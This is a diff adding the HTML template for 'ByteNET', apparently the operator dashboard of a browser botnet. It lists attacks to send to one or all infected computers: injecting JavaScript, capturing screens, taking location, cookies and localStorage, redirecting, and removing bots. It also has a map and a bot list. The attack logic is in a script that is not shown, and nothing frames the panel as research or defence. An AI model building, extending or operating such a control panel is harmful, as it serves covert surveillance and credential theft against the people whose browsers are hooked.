@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Bot Dashboard</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/leaflet.css') }}" /> 
+  <script src="{{ url_for('static', filename='js/leaflet.js') }}"></script> 
+  <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/main.css') }}">
+</head>
+<body>
+  <nav class="navbar">
+    <a class="navbar-item left" href="/logout" style="opacity: 0;">Logout</a>
+    <a class="navbar-brand" href="/dashboard" style="opacity: 100%;">ByteNET</a>
+    <a class="navbar-item right" href="/payload" style="opacity: 0;">Payload</a>
+  </nav>
+  <div class="container">
+    <div class="top">
+        <div class="dropdown-container">
+        <h2>Simple Attacks</h2>
+        <select id="attacktype" onchange="handleSelection()">
+            <option value="attack1">Embed JS</option>
+            <option value="attack2">Screen Capture</option>
+            <option value="attack3">Location</option>
+            <option value="attack4">Cookies</option>
+            <option value="attack5">LocalStorage</option>
+            <option value="attack6">Redirect</option>
+            <option value="attack7">Remove Bot</option>
+        </select>
+        <select id="computer" onchange="handleSelection()">
+            <option value="aalc">ALL Computers</option>
+            <option value="oolc">ONE Computer</option>
+        </select>
+        <div class="inputsattack">
+          <input type="code" class="atkinput1">
+          <select class="atkinput2" id="atkinput2">
+            
+          </select>
+        </div>
+        <button id="AttackBtn" onclick="checkfields()">
+          Send Attack
+        </button>
+        </div>
+        <div class="map-container" id="map">
+            <div id="mapid" style="height: 100%; width: 100%;"></div>
+        </div>
+    </div>
+  </div>
+  <div class="bot-container">
+    <h2>Bots</h2>
+    <div class="bot-list">
+    </div>
+  </div>
+  <script src="{{ url_for('static', filename='js/dash.js') }}"></script>
+
+</body>
+</html>
